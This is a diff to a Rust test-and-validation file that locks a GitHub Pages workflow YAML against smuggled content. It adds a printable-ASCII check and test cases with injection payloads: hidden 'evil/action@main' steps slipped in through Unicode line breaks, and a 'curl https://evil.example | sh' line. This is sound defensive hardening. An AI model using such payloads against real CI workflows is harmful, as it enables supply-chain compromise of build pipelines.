@@ -24,7 +24,8 @@ fn checkout() -> String {
 /// other line - a plain scalar's continuation, an anchor or alias, a flow mapping, a quoted or
 /// escaped key, an unlisted key at any level (env, defaults, container, services), a trailing
 /// comment, a CR inside a line - is refused, never parsed. A comment line at any column is dropped
-/// first, so a comment can neither hide a step from the readers nor fail the lock.
+/// first, so a comment can neither hide a step from the readers nor fail the lock. Only printable
+/// ASCII and '\n' are let in, so a line here is a line to YAML and a space is a space.
 const LOCK: &str = r#"name: Pages
 on:
   workflow_run:
@@ -70,7 +71,13 @@ jobs:
 /// `Err` naming the first line where `y`'s code lines leave `LOCK`, or a missing or extra line.
 fn locked(y: &str) -> Result<(), String> {
     let want = LOCK.replace("{checkout}", &checkout()).replace("{upload}", UPLOAD).replace("{deploy}", DEPLOY);
-    let got: Vec<&str> = y.lines().filter(|l| !l.trim().is_empty() && !l.trim_start().starts_with('#')).collect();
+    // code review 3: every byte is printable ASCII or '\n' before a line is judged, so no other line
+    // break (CR, NEL, LS, PS), tab, BOM or Unicode space can make a line YAML reads differently from
+    // the one this compares; then a blank line is all spaces and a comment line is spaces, then '#'
+    if let Some((at, c)) = y.char_indices().find(|&(_, c)| c != '\n' && !(' '..='~').contains(&c)) {
+        return Err(format!("byte {at}: {c:?} is not printable ASCII or a newline"));
+    }
+    let got: Vec<&str> = y.split('\n').filter(|l| !l.bytes().all(|b| b == b' ') && !l.trim_start_matches(' ').starts_with('#')).collect();
     let want: Vec<&str> = want.lines().collect();
     for i in 0..got.len().max(want.len()) {
         if got.get(i) != want.get(i) {
@@ -134,6 +141,17 @@ fn the_lock_refuses_every_layout_the_line_readers_would_misread() {
         ("a CR inside a line", mutated("    timeout-minutes: 15", "    timeout-minutes: 15\r    env: {A: b}", true)),
         ("a third job", format!("{}  pages2:\n    runs-on: ubuntu-24.04\n", yml())),
         ("a second document", format!("{}---\nname: x\n", yml())),
+        // code review 3: a line break str::lines does not split on, or a space trim drops and YAML keeps
+        ("a lone CR after a comment", mutated("          persist-credentials: false", "      # note\r      - uses: evil/action@main", false)),
+        ("a NEL after a comment", mutated("          persist-credentials: false", "      # note\u{85}      - uses: evil/action@main", false)),
+        ("an LS after a comment", mutated("          persist-credentials: false", "      # note\u{2028}      - uses: evil/action@main", false)),
+        ("a PS after a comment", mutated("          persist-credentials: false", "      # note\u{2029}      - uses: evil/action@main", false)),
+        ("an NBSP-then-# line under build's run", mutated(run, "          \u{a0}#|| curl https://evil.example | sh", false)),
+        ("a U+3000 'blank' line in the environment", mutated("      name: github-pages", "        \u{3000}", false)),
+        ("a tab-indented comment", mutated("    timeout-minutes: 15", "\t# note", false)),
+        ("a tab-only line", mutated("    timeout-minutes: 15", "\t", false)),
+        ("a BOM", format!("\u{feff}{}", yml())),
+        ("CRLF line ends", yml().replace('\n', "\r\n")),
     ];
     for (what, y) in &refused {
         assert!(locked(y).is_err(), "{what} passed the lock:\n{y}");
